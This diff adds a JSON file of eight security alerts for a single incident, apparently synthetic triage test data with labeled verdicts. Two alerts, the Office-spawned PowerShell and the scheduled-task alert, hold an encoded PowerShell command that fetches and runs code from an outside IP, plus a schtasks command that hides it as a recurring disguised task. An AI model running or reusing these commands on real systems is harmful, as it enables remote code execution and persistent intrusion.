@@ -1,0 +1,611 @@
+[
+  {
+    "alert_id": "alert-20260915-0001",
+    "schema_version": "1.0",
+    "timestamp": "2026-08-15T09:00:00Z",
+    "ingested_at": "2026-08-15T09:04:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process",
+        "execution"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Execution: Office App Spawned PowerShell",
+      "description": "Word or Excel spawned PowerShell.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1059.001"
+      ]
+    },
+    "alert": {
+      "title": "Execution: Office App Spawned PowerShell",
+      "summary": "WINWORD.EXE spawned obfuscated PowerShell.",
+      "status": "new",
+      "confidence": 0.67,
+      "risk_score": 95,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-FIN01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "asmith"
+      },
+      "process": {
+        "name": "powershell.exe",
+        "command_line": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMgAwADIALgAxADcAMQAuADQAMwAuADEANwA2AC8AYQBwAGkALwB2ADEALwB1AHAAZABhAHQAZQAgAHwAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4A",
+        "parent_process": "WINWORD.EXE"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0001",
+      "host_risk": 74,
+      "user_risk": 26,
+      "asset_criticality": "Medium",
+      "attack_stage": "execution",
+      "kill_chain_phase": "Execution"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1059.001",
+        "name": "Command and Scripting Interpreter: PowerShell"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "process_name": "powershell.exe"
+        }
+      }
+    ],
+    "knowledge_base": "Execution: Office App Spawned PowerShell - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260915-0002",
+    "schema_version": "1.0",
+    "timestamp": "2026-08-15T09:02:00Z",
+    "ingested_at": "2026-08-15T09:05:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "discovery"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "low",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Network: DNS Query to Internal Server",
+      "description": "Multiple internal DNS queries.",
+      "severity": "low",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Network: DNS Query to Internal Server",
+      "summary": "Host querying AD DNS.",
+      "status": "new",
+      "confidence": 0.52,
+      "risk_score": 14,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "network:dns",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "DNS-SERVER-01",
+      "type": "server"
+    },
+    "actor": {
+      "user": {
+        "name": "SYSTEM"
+      }
+    },
+    "context": {
+      "raw_source": "network:dns",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0002",
+      "host_risk": 34,
+      "user_risk": 46,
+      "asset_criticality": "Medium"
+    },
+    "knowledge_base": "Authorized scan, verified with IT team."
+  },
+  {
+    "alert_id": "alert-20260915-0003",
+    "schema_version": "1.0",
+    "timestamp": "2026-08-15T09:05:00Z",
+    "ingested_at": "2026-08-15T09:10:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "c2"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Network: PowerShell Connection to Suspicious IP",
+      "description": "PowerShell connecting to 202.171.43.176.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1105"
+      ]
+    },
+    "alert": {
+      "title": "Network: PowerShell Connection to Suspicious IP",
+      "summary": "PowerShell connected to 202.171.43.176 over port 80.",
+      "status": "new",
+      "confidence": 0.88,
+      "risk_score": 91,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-EDGE-01",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "asmith"
+      },
+      "process": {
+        "name": "powershell.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0003",
+      "host_risk": 71,
+      "user_risk": 75,
+      "asset_criticality": "Medium",
+      "attack_stage": "command-and-control",
+      "kill_chain_phase": "Command and Control"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1105",
+        "name": "Ingress Tool Transfer"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_connection",
+        "data": {
+          "dst_ip": "202.171.43.176"
+        }
+      }
+    ],
+    "network": {
+      "src_ip": "10.10.2.33",
+      "dst_ip": "202.171.43.176",
+      "dst_port": 80
+    },
+    "additional_context": "Fileless PowerShell executing Invoke-RestMethod to 202.171.43.176.",
+    "knowledge_base": "Network: PowerShell Connection to Suspicious IP"
+  },
+  {
+    "alert_id": "alert-20260915-0004",
+    "schema_version": "1.0",
+    "timestamp": "2026-08-15T09:10:00Z",
+    "ingested_at": "2026-08-15T09:11:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "process",
+        "persistence"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "critical",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Persistence: Scheduled Task Created with PowerShell",
+      "description": "schtasks.exe creating a task that runs PowerShell.",
+      "severity": "critical",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1053.005"
+      ]
+    },
+    "alert": {
+      "title": "Persistence: Scheduled Task Created with PowerShell",
+      "summary": "schtasks.exe used to maintain fileless persistence.",
+      "status": "new",
+      "confidence": 0.71,
+      "risk_score": 80,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "endpoint:edr",
+      "vendor": "Unknown",
+      "module": "endpoint"
+    },
+    "observer": {
+      "name": "DESKTOP-FIN01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "asmith"
+      },
+      "process": {
+        "name": "schtasks.exe",
+        "command_line": "schtasks /create /sc minute /mo 15 /tn \"\\Microsoft\\Windows\\AppInfo\\Updater\" /tr \"powershell.exe -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBSAGUAcwB0AE0AZQB0AGgAbwBkACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AMgAwADIALgAxADcAMQAuADQAMwAuADEANwA2AC8AYQBwAGkALwB2ADEALwB1AHAAZABhAHQAZQAgAHwAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4A\" /F",
+        "parent_process": "powershell.exe"
+      }
+    },
+    "context": {
+      "raw_source": "endpoint:edr",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0004",
+      "host_risk": 20,
+      "user_risk": 78,
+      "asset_criticality": "Medium",
+      "attack_stage": "persistence",
+      "kill_chain_phase": "Installation"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1053.005",
+        "name": "Scheduled Task/Job: Scheduled Task"
+      }
+    },
+    "evidence": [
+      {
+        "type": "process_creation",
+        "data": {
+          "process_name": "schtasks.exe"
+        }
+      }
+    ],
+    "knowledge_base": "Persistence: Scheduled Task Created with PowerShell - Verify the process execution and command line arguments with the System Administrator."
+  },
+  {
+    "alert_id": "alert-20260915-0005",
+    "schema_version": "1.0",
+    "timestamp": "2026-08-15T09:15:00Z",
+    "ingested_at": "2026-08-15T09:16:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "authentication"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "low",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "Authentication: Failed Logon",
+      "description": "Failed logon attempt.",
+      "severity": "low",
+      "signature": "UNKNOWN",
+      "mitre_attack": []
+    },
+    "alert": {
+      "title": "Authentication: Failed Logon",
+      "summary": "Failed logon attempt.",
+      "status": "new",
+      "confidence": 0.53,
+      "risk_score": 24,
+      "verdict": "false_positive"
+    },
+    "source": {
+      "product": "windows:security",
+      "vendor": "Unknown",
+      "module": "windows"
+    },
+    "observer": {
+      "name": "DC-01",
+      "type": "endpoint"
+    },
+    "actor": {
+      "user": {
+        "name": "jsmith"
+      },
+      "process": {
+        "name": "lsass.exe"
+      }
+    },
+    "context": {
+      "raw_source": "windows:security",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0005",
+      "host_risk": 51,
+      "user_risk": 52,
+      "asset_criticality": "Medium"
+    },
+    "knowledge_base": "Expected user activity, verified with the user."
+  },
+  {
+    "alert_id": "alert-20260915-0006",
+    "schema_version": "1.0",
+    "timestamp": "2026-08-15T09:25:00Z",
+    "ingested_at": "2026-08-15T09:27:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "c2"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "C2: Scheduled Task Beaconing",
+      "description": "Periodic connections to 202.171.43.176.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1071.001"
+      ]
+    },
+    "alert": {
+      "title": "C2: Scheduled Task Beaconing",
+      "summary": "Scheduled task executed and beaconed to 202.171.43.176.",
+      "status": "new",
+      "confidence": 0.71,
+      "risk_score": 81,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-EDGE-01",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "asmith"
+      },
+      "process": {
+        "name": "powershell.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0006",
+      "host_risk": 90,
+      "user_risk": 39,
+      "asset_criticality": "Medium",
+      "attack_stage": "command-and-control",
+      "kill_chain_phase": "Command and Control"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_connection",
+        "data": {
+          "dst_ip": "202.171.43.176"
+        }
+      }
+    ],
+    "network": {
+      "src_ip": "10.10.2.33",
+      "dst_ip": "202.171.43.176",
+      "dst_port": 80
+    },
+    "knowledge_base": "C2: Scheduled Task Beaconing"
+  },
+  {
+    "alert_id": "alert-20260915-0007",
+    "schema_version": "1.0",
+    "timestamp": "2026-08-15T09:40:00Z",
+    "ingested_at": "2026-08-15T09:43:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "c2"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "C2: Scheduled Task Beaconing",
+      "description": "Periodic connections to 202.171.43.176.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1071.001"
+      ]
+    },
+    "alert": {
+      "title": "C2: Scheduled Task Beaconing",
+      "summary": "Scheduled task executed and beaconed to 202.171.43.176.",
+      "status": "new",
+      "confidence": 0.68,
+      "risk_score": 92,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-EDGE-01",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "asmith"
+      },
+      "process": {
+        "name": "powershell.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0007",
+      "host_risk": 42,
+      "user_risk": 87,
+      "asset_criticality": "Medium",
+      "attack_stage": "command-and-control",
+      "kill_chain_phase": "Command and Control"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_connection",
+        "data": {
+          "dst_ip": "202.171.43.176"
+        }
+      }
+    ],
+    "network": {
+      "src_ip": "10.10.2.33",
+      "dst_ip": "202.171.43.176",
+      "dst_port": 80
+    },
+    "knowledge_base": "C2: Scheduled Task Beaconing"
+  },
+  {
+    "alert_id": "alert-20260915-0008",
+    "schema_version": "1.0",
+    "timestamp": "2026-08-15T09:55:00Z",
+    "ingested_at": "2026-08-15T09:59:00Z",
+    "event": {
+      "kind": "alert",
+      "category": [
+        "network",
+        "c2"
+      ],
+      "type": [
+        "detection"
+      ],
+      "severity": "high",
+      "outcome": "unknown"
+    },
+    "rule": {
+      "id": "UNKNOWN",
+      "name": "C2: Scheduled Task Beaconing",
+      "description": "Periodic connections to 202.171.43.176.",
+      "severity": "high",
+      "signature": "UNKNOWN",
+      "mitre_attack": [
+        "T1071.001"
+      ]
+    },
+    "alert": {
+      "title": "C2: Scheduled Task Beaconing",
+      "summary": "Scheduled task executed and beaconed to 202.171.43.176.",
+      "status": "new",
+      "confidence": 0.94,
+      "risk_score": 91,
+      "verdict": "true_positive"
+    },
+    "source": {
+      "product": "network:firewall",
+      "vendor": "Unknown",
+      "module": "network"
+    },
+    "observer": {
+      "name": "FW-EDGE-01",
+      "type": "firewall"
+    },
+    "actor": {
+      "user": {
+        "name": "asmith"
+      },
+      "process": {
+        "name": "powershell.exe"
+      }
+    },
+    "context": {
+      "raw_source": "network:firewall",
+      "incident_id": "INC-2026-9500",
+      "correlation_id": "corr-fl-alert-20260915-0008",
+      "host_risk": 67,
+      "user_risk": 85,
+      "asset_criticality": "Medium",
+      "attack_stage": "command-and-control",
+      "kill_chain_phase": "Command and Control"
+    },
+    "threat": {
+      "technique": {
+        "id": "T1071.001",
+        "name": "Application Layer Protocol: Web Protocols"
+      }
+    },
+    "evidence": [
+      {
+        "type": "network_connection",
+        "data": {
+          "dst_ip": "202.171.43.176"
+        }
+      }
+    ],
+    "network": {
+      "src_ip": "10.10.2.33",
+      "dst_ip": "202.171.43.176",
+      "dst_port": 80
+    },
+    "knowledge_base": "C2: Scheduled Task Beaconing"
+  }
+]
